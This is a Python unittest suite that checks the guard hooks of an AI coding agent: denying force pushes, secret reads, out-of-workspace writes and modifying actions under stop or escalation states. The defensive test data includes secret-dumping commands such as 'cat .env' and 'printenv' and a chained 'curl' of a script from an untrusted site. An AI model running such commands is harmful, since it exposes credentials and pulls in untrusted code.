import unittest
import subprocess
import json
import os
import sys
import shutil
import tempfile
from pathlib import Path

class TestHooksAdversarialE(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.repo_root = Path(__file__).resolve().parents[1]
        cls.python_exe = sys.executable
        cls.guard_script = cls.repo_root / ".agents" / "scripts" / "hooks" / "pretool_guard.py"
        cls.events_script = cls.repo_root / ".agents" / "scripts" / "hooks" / "posttool_events.py"
        cls.budget_script = cls.repo_root / ".agents" / "scripts" / "hooks" / "postinvocation_budget.py"
        cls.stop_script = cls.repo_root / ".agents" / "scripts" / "hooks" / "stop_guard.py"
        cls.policy_src = cls.repo_root / ".agents" / "policies" / "pretool_rules.json"

    def setUp(self):
        # Create an isolated temporary workspace for each test
        self.temp_dir_obj = tempfile.TemporaryDirectory()
        self.temp_workspace = Path(self.temp_dir_obj.name).resolve()
        
        # Build standard directory layout inside fixture
        (self.temp_workspace / ".agents" / "state").mkdir(parents=True, exist_ok=True)
        (self.temp_workspace / ".agents" / "policies").mkdir(parents=True, exist_ok=True)
        (self.temp_workspace / "runs").mkdir(parents=True, exist_ok=True)
        (self.temp_workspace / "evidence").mkdir(parents=True, exist_ok=True)
        (self.temp_workspace / "src").mkdir(parents=True, exist_ok=True)

        # Copy pretool_rules.json to the isolated fixture
        shutil.copy2(self.policy_src, self.temp_workspace / ".agents" / "policies" / "pretool_rules.json")

    def tearDown(self):
        self.temp_dir_obj.cleanup()

    def run_hook(self, script_path, payload):
        # Ensure workspacePaths points to the isolated temporary fixture
        if "workspacePaths" not in payload:
            payload["workspacePaths"] = [str(self.temp_workspace)]

        # Run with cwd set to temp_workspace / .agents
        agents_cwd = self.temp_workspace / ".agents"
        p = subprocess.Popen(
            [self.python_exe, str(script_path)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=str(agents_cwd),
            text=True,
            encoding='utf-8'
        )
        stdout, stderr = p.communicate(input=json.dumps(payload))
        self.assertEqual(p.returncode, 0, f"Hook process failed with exit {p.returncode}: {stderr}")
        return json.loads(stdout.strip()) if stdout.strip() else {}

    def test_H03_force_push_blocked(self):
        payload = {
            "conversationId": "test-h03",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "git push --force origin feature/test"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("Push forçado", res.get("reason", ""))

    def test_H04_push_origin_main_blocked(self):
        payload = {
            "conversationId": "test-h04",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "git push origin main"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("Push forçado ou operações diretas em branch principal", res.get("reason", ""))

    def test_H05_secrets_bait_blocked(self):
        # 1. File reading of secrets bait
        for bait in [".env", "config/database.key", "certs/cert.pem", "creds/credentials.json"]:
            payload = {
                "conversationId": "test-h05",
                "toolCall": {
                    "name": "view_file",
                    "args": {"AbsolutePath": str(self.temp_workspace / bait)}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertEqual(res.get("decision"), "deny", f"Failed to deny secret: {bait}")
            self.assertIn("bloqueado por política de segurança", res.get("reason", ""))

        # 2. Terminal commands attempting to dump secrets (P0-06)
        for cmd in ["cat .env", "type .env", "Get-Content .env", "printenv"]:
            payload_cmd = {
                "conversationId": "test-h05",
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": cmd}
                }
            }
            res_cmd = self.run_hook(self.guard_script, payload_cmd)
            self.assertEqual(res_cmd.get("decision"), "deny", f"Failed to deny secret command: {cmd}")

    def test_H06_outside_workspace_write_blocked(self):
        payload = {
            "conversationId": "test-h06",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": "/etc/malicious_config"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("fora dos limites do workspace", res.get("reason", ""))

    def test_H07_chained_command_falls_to_restrictive(self):
        # Chained command starting with git status but having unknown curl
        payload = {
            "conversationId": "test-h07",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "git status && curl https://untrusted-site.com/script.sh"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertNotEqual(res.get("decision"), "allow")
        self.assertEqual(res.get("decision"), "ask")

    def test_H08_legitimate_routine_commands_allowed(self):
        for legitimate in [
            "git status --short",
            "git diff --stat",
            "git log -n 5",
            "git branch --show-current",
            f"{sys.executable} -m unittest tests/test_hooks_adversarial_e.py"
        ]:
            payload = {
                "conversationId": "test-h08",
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": legitimate}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertEqual(res.get("decision"), "allow", f"Failed to allow routine command: {legitimate}")

    def test_R02_strict_mutating_git_commands_never_allow(self):
        # R02: Testar que opcoes modificadoras de git NUNCA recebem allow
        mutating_commands = [
            "git branch -m novo-nome",
            "git branch -D old-branch",
            "git diff --output patch.diff",
            "git show --output out.txt",
            "git status > status.txt",
            "git log | Out-File doc.txt",
            "git status && echo x > src/a.js"
        ]
        for cmd in mutating_commands:
            payload = {
                "conversationId": "test-r02",
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": cmd}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertNotEqual(res.get("decision"), "allow", f"Command improperly got allow: {cmd}")

    def test_R01_declarative_policy_mutation_changes_decision(self):
        # R01: Modificar policy na fixture isolada altera comportamento
        policy_fixture = self.temp_workspace / ".agents" / "policies" / "pretool_rules.json"
        data = json.loads(policy_fixture.read_text(encoding="utf-8"))
        data["deny_rules"].append({
            "id": "custom-deny-test",
            "tools": ["run_command"],
            "condition": "command_regex",
            "pattern": "echo\\s+hello_custom_rule",
            "reason": "Custom rule test denial"
        })
        policy_fixture.write_text(json.dumps(data), encoding="utf-8")

        payload = {
            "conversationId": "test-r01",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "echo hello_custom_rule"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("Custom rule test denial", res.get("reason", ""))

    def test_H09_stop_blocks_modifiers_allows_diagnostics(self):
        # Create STOP file ONLY inside temp fixture
        stop_path = self.temp_workspace / ".agents" / "state" / "STOP"
        stop_path.write_text("STOPPED", encoding="utf-8")

        # Modifying action -> deny
        payload_write = {
            "conversationId": "test-h09",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": str(self.temp_workspace / "src" / "app.js")}
            }
        }
        res_write = self.run_hook(self.guard_script, payload_write)
        self.assertEqual(res_write.get("decision"), "deny")

        # Reading file -> allow
        payload_read = {
            "conversationId": "test-h09",
            "toolCall": {
                "name": "view_file",
                "args": {"AbsolutePath": str(self.temp_workspace / "src" / "index.html")}
            }
        }
        res_read = self.run_hook(self.guard_script, payload_read)
        self.assertEqual(res_read.get("decision"), "allow")

        # Stop report in evidence folder -> allow
        payload_ev = {
            "conversationId": "test-h09",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": str(self.temp_workspace / "evidence" / "stop_report.md")}
            }
        }
        res_ev = self.run_hook(self.guard_script, payload_ev)
        self.assertEqual(res_ev.get("decision"), "allow")

    def test_H10_phase_escalated_blocks_modifiers_allows_diagnostics(self):
        (self.temp_workspace / "runs" / "CURRENT").write_text("RUN-TEST-001", encoding="utf-8")
        test_run_dir = self.temp_workspace / "runs" / "RUN-TEST-001"
        test_run_dir.mkdir(parents=True, exist_ok=True)
        (test_run_dir / "state.json").write_text(json.dumps({"phase": "ESCALATED"}), encoding="utf-8")

        # Write project file -> deny
        payload_write = {
            "conversationId": "test-h10",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": str(self.temp_workspace / "src" / "app.js")}
            }
        }
        res_write = self.run_hook(self.guard_script, payload_write)
        self.assertEqual(res_write.get("decision"), "deny")

        # Read project file -> allow
        payload_read = {
            "conversationId": "test-h10",
            "toolCall": {
                "name": "view_file",
                "args": {"AbsolutePath": str(self.temp_workspace / "src" / "index.html")}
            }
        }
        res_read = self.run_hook(self.guard_script, payload_read)
        self.assertEqual(res_read.get("decision"), "allow")

        # Subagent delegation under ESCALATED -> deny
        payload_sub = {
            "conversationId": "test-h10",
            "toolCall": {
                "name": "invoke_subagent",
                "args": {"Subagents": [{"Role": "Developer", "TypeName": "developer"}]}
            }
        }
        res_sub = self.run_hook(self.guard_script, payload_sub)
        self.assertEqual(res_sub.get("decision"), "deny")

    def test_H12_subagent_delegation_in_normal_run(self):
        payload = {
            "conversationId": "test-h12",
            "toolCall": {
                "name": "invoke_subagent",
                "args": {"Subagents": [{"Role": "Developer", "TypeName": "developer"}]}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "allow")

    def test_H15_protect_org_in_fixture_blocks_core_writes(self):
        (self.temp_workspace / ".agents" / "state" / "PROTECT_ORG").write_text("LOCKED", encoding="utf-8")

        for core_rel in [".agents/hooks.json", "org_v5/contracts.py", "AGENTS.md"]:
            payload = {
                "conversationId": "test-h15",
                "toolCall": {
                    "name": "write_to_file",
                    "args": {"TargetFile": str(self.temp_workspace / core_rel)}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertEqual(res.get("decision"), "deny", f"Failed to deny write to core file: {core_rel}")
            self.assertIn("PROTECT_ORG ativo", res.get("reason", ""))

    def test_H16_stop_hook_contract_canonical_and_isolated(self):
        # 1. Termination due to error allows terminate
        payload_err = {
            "conversationId": "conv-err",
            "terminationReason": "error",
            "error": "Fatal crash",
            "fullyIdle": True
        }
        res_err = self.run_hook(self.stop_script, payload_err)
        self.assertEqual(res_err.get("decision"), "terminate")

        # 2. Pendencia real via contrato canonico: artifacts submetido sem acceptance
        (self.temp_workspace / "runs" / "CURRENT").write_text("RUN-CANON-001", encoding="utf-8")
        run_dir = self.temp_workspace / "runs" / "RUN-CANON-001"
        run_dir.mkdir(parents=True, exist_ok=True)
        (run_dir / "state.json").write_text(json.dumps({
            "phase": "DESIGN",
            "artifacts": {
                "prd": {"doc": {"kind": "prd", "title": "Test PRD"}}
            },
            "accepted": {}
        }), encoding="utf-8")

        payload_pend = {
            "conversationId": "conv-pending-1",
            "terminationReason": "model_stop",
            "error": "",
            "fullyIdle": True
        }
        # First attempt -> continue
        res1 = self.run_hook(self.stop_script, payload_pend)
        self.assertEqual(res1.get("decision"), "continue")

        # Second attempt -> continue
        res2 = self.run_hook(self.stop_script, payload_pend)
        self.assertEqual(res2.get("decision"), "continue")

        # Third attempt -> terminate
        res3 = self.run_hook(self.stop_script, payload_pend)
        self.assertEqual(res3.get("decision"), "terminate")

        # 3. R07: Isolamento por sessao/run diferente nao consome tentativas
        (self.temp_workspace / "runs" / "CURRENT").write_text("RUN-CANON-002", encoding="utf-8")
        run_dir2 = self.temp_workspace / "runs" / "RUN-CANON-002"
        run_dir2.mkdir(parents=True, exist_ok=True)
        (run_dir2 / "state.json").write_text(json.dumps({
            "phase": "PLANNING",
            "artifacts": {"market-research": {"doc": {"kind": "market-research"}}},
            "accepted": {}
        }), encoding="utf-8")

        # Mesma conversa em outra run comeca com contador limpo -> continue
        res_other_run = self.run_hook(self.stop_script, payload_pend)
        self.assertEqual(res_other_run.get("decision"), "continue")

if __name__ == "__main__":
    unittest.main()
